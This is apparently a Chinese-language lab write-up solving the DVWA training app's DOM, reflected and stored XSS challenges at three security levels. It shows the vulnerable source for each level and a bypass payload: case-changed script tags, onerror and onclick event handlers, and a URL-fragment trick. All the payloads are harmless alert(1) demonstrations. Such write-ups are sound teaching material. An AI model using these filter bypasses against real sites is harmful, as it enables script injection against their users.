# §10 DOM型XSS

## §10.1 Low

分析前端JavaScript：

```javascript
if (document.location.href.indexOf("default=") >= 0) {
	var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
	document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
	document.write("<option value='' disabled='disabled'>----</option>");
}
    
document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>");
```

容易发现，菜单中的第一项正是上次提交的值，而且这个值只由`url`中的`default`参数决定。马上尝试绕过`><`。

```
访问URL:
	http://localhost/DVWA/vulnerabilities/xss_d/?default=
		><script>alert(1)</script><option
```

## §10.2 Medium

后端PHP多了过滤逻辑，如果检测到`$_GET['default']`包含`<script`时（不区分大小写），就将其强行设为`English`：

```php
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}
```

我们可以通过JavaScript事件绕过：

```
访问URL:
	?default=</option></select><img src='x' onerror='alert(1)'><option>
```

## §10.3 High

后端PHP现在开了白名单，只允许`$_GET['default']`为预先指定的值：

```php
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
```

然而前端渲染时用的不是真正意义上的GET传的那个`default`，而是URL通过`substring(indexOf('default'))`指定的字符串，这意味着URL中`?default=`之后的所有字符都将被视为`default`的值，这显然不符合常理，因为URL之后还可以有定位符`#`。我们把恶意脚本放在定位符中，此时后端并不能获取到`#`之后的内容：

```
访问URL:
	?default=English#<script>alert(1)</script>
```

# §11 反射型XSS

## §11.1 Low

直接注：

```
<script>alert(1);</script>
```

## §11.2 Medium

后端PHP加了个检测`<script>`的过滤逻辑：

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    echo "<pre>Hello ${name}</pre>";
}
```

> 注意：HTML的标签名不区分大小写，这意味着`<script>`和`<ScRiPt>`是完全等价的，首标签和闭标签完全可以混用。

既然HTML标签名对大小写不敏感，我们就可以使用全大写的标签名绕过WAF：

```
<SCRIPT>alert(1);</SCRIPT>
```

## §11.3 High

```php
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    echo "<pre>Hello ${name}</pre>";
}
```

现在`preg_replace()`不允许出现`<script`，且忽略大小写。这就堵死了注入`<script>`标签这条路。然而HTML中能执行JavaScript的不止`<script>`，还有各标签的JavaScript事件。

```
</pre><img src="#" onerror="alert(1)"><pre>
```

# §12 存储型XSS

## §12.1 Low

```php
$message = trim( $_POST[ 'mtxMessage' ] );
$name    = trim( $_POST[ 'txtName' ] );
```

分析源码可知这个POST请求中的`Name`和`Message`均为注入点。其中前端限制了`Name`字段的`<input maxLength="10">`，开审查元素删了就行。

```
?mtxMessage=<script>alert(1);</script>
	&txtName=<script>alert(1);</script>
```

## §12.2 Medium

```php
$message = trim( $_POST[ 'mtxMessage' ] );
$name    = trim( $_POST[ 'txtName' ] );
$message = htmlspecialchars( $message );
$name = str_replace( '<script>', '', $name );
```

`$message`被`htmlspecialchars()`处理后，所有的特殊字符都变成了实体的形式，因此不再是注入点，问题的重点转移到了怎么绕过`$name`的这个`str_replace()`。

既然HTML标签名对大小写不敏感，我们就可以使用全大写的标签名绕过WAF：

```
?mtxMessage=HelloWorld
	&txtName=<SCRIPT>alert(1);</SCRIPT>
```

## §12.3 Hign

```php
$name = trim( $_POST[ 'txtName' ] );
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
```

与[§11.3](#§11.3)类似，可以使用JavaScript事件绕过：

```
?txtName=<button onclick="alert(1)"/>
?txtName=<img src=# onerror=alert("1")>
```

